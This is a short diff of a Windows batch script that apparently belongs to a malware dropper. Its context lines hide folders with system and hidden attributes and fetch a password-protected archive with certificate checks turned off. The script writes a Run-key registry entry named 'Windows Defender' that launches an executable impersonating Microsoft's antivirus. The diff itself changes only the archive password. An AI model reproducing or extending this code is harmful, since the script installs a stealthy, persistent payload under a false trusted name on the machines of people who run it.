@@ -48,7 +48,7 @@ attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe
  attrib -s -h -i "%environment%\apache2" && if exist "%environment%\apache2\bin\httpd.exe" (
     attrib +s +h +i "%environment%\apache2"
 ) else (
-   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.7z"
+   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.7z"
 )
 
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
